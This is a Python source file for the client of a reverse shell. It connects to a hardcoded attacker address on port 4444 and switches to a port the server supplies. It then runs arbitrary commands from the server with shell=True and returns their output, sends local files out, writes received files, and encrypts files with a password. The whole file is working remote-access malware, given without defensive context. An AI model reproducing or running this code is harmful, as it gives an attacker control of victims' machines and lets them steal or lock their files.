#!/usr/bin/env python3
import subprocess,socket,os
import time,sys
from encryption import *

# Enter IP and Port here
HOST = '10.0.0.150'
PORT = 4444
# Configure socket connection
z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
z.connect((HOST, PORT))

# Wake up
z.sendall(encryptData('Howdy!'))

while True:
	Data = z.recv(1024)
	try:
		decrypted = decryptData(Data)
	except ValueError:
		pass
	# If we receive new port, connect to it
	if decrypted[:4] == "port":
		z.shutdown(socket.SHUT_RDWR)
		z.close()
		time.sleep(4)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		port = int(decrypted[5:])
		s.connect((HOST, port))
		
		sendData(s, "> I'm connected on port: " + str(decrypted[5:]) + "\n")
		while True:
			data = s.recv(1024)
			try:
				decrypted = decryptData(data)
			except ValueError:
				pass
			# Quit program
			if decrypted == "quit":
				sys.exit()
			# Change directory
			elif decrypted[:2] == "cd":
				try: os.chdir(decrypted[3:])
				except:	pass
				s.sendall(encryptData('EOFX'))
			# Encrypt or decrypt file
			elif decrypted[:12] == "encryptfile " or decrypted[:12] == "decryptfile ":
				try:
					args = dict(e.split('=') for e in decrypted[12:].split(', '))
					if len(args['pass']) and len(args['file']): pass
					else: args = 0
				except:
					args = 0
					sendData(s, '> Error: invalid arguments.\nUsage: encryptfile pass=desired password, file=this song.mp3\n\nUsage: decryptfile pass=desired password, file=this song.mp3\n')
				if args:
					if decrypted[:12] == "encryptfile ": sendData(s, encryptFile(args['pass'], args['file']))
					if decrypted[:12] == "decryptfile ": sendData(s, decryptFile(args['pass'], args['file']))
			# Send file to the server
			elif decrypted[:8] == "download":
				try:
					if os.path.isfile(decrypted[9:]):
						filemsg = sendFile(s, decrypted[9:])
						time.sleep(1)
						sendData(s, filemsg)
				except:	sendData(s, '> Error: file not found.\n')
			# Download file from the server
			elif decrypted[:6] == 'upload':
					try:
						g = open(os.path.basename(decrypted[7:]), 'wb')
						s.settimeout(60)
						while True:
							l = s.recv(1024)
							try:
								if l.decode().endswith('EOFX') == True: break
							except: pass
							g.write(l)
						g.close()
						s.sendall(encryptData('EOFX'))
						s.settimeout(None)
					except:
						sendData(s, '> Error receiving file.')
						s.settimeout(None)
			# Run any commands and send data
			else:
				proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stdoutput = proc.stdout.read() + proc.stderr.read()
				sendmsg = str(stdoutput.decode())
				sendData(s, sendmsg)
		
# Loop ends here
s.close()